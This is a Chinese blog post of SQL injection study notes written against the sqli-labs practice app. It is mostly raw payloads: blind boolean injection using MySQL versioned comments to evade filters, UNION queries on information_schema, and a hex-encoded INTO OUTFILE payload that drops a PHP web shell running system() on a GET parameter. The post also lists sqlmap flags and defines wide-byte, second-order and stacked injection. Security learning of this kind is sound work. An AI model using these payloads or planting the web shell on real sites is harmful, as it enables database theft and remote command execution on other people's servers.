<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213932536.png" alt="image-20250821205315231"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.142.144/sqli-labs/Less-1/?id=1&#x27; /*!23456*/and/*!23456*/ascii(substr(database(),1,1))=115 --+</span><br><span class="line"></span><br><span class="line">http://192.168.142.144/sqli-labs/Less-1/?id=1&#x27; union select from information_schema where table_schema=seccurity--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; /*!/*!UNION*/ /*!SELECT*/*/ 1,2,3 </span><br><span class="line">/*!/*!FROM*/ information_schema.tables*/*/ </span><br><span class="line">/*!/*!WHERE*/ table_schema=&#x27;security&#x27;*/*/--+</span><br></pre></td></tr></table></figure>



<p>?id&#x3D;1111’ union select 1,0x3c3f7068702073797374656d28245f4745545b27737472275d293b203f3e,3 into outfile ‘D:&#x2F;phpStudy&#x2F;WWW&#x2F;2.php’–+</p>
<?php system($_GET['str']); ?>

<p>3c3f7068702073797374656d28245f4745545b27737472275d293b203f3e</p>
<p>–current-user</p>
<p>–dump</p>
<p>–level 3</p>
<p>–risk</p>
<p>-p</p>
<p>宽字节注入：利用数据库和应用程序对字符编码处理不一致的漏洞，让转义符失效，使原本被转义的敏感字符（如单引号<code>&#39;</code>）可以正常生效，进而闭合SQL语句完成注入。</p>
<p>二次注入：攻击者将含有恶意SQL代码的输入先存入数据库中。之后，当应用程序再次从数据库取出该数据，并未经检查便用于执行新的SQL查询时，触发的注入漏洞。对数据库的数据无条件信任</p>
<p>堆叠注入：攻击者利用分号<code>;</code>在一次数据库查询请求后追加执行额外的SQL语句。堆叠注入可以执行任意SQL语句（如INSERT, UPDATE, DROP等）。</p>
<p>万能密码：通过在登录查询中构造一个永真条件，来绕过用户名和密码验证。</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">wickt42</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/08/21/SQL注入其他方法/">http://example.com/2025/08/21/SQL注入其他方法/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2025/08/22/SQL%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa fa-chevron-left">  </i><span>SQL注入代码审计</span></a></div><div class="next-post pull-right"><a href="/2025/08/20/sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/"><span>SQL注入练习</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250729164955479.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2025 By wickt42</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"left","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>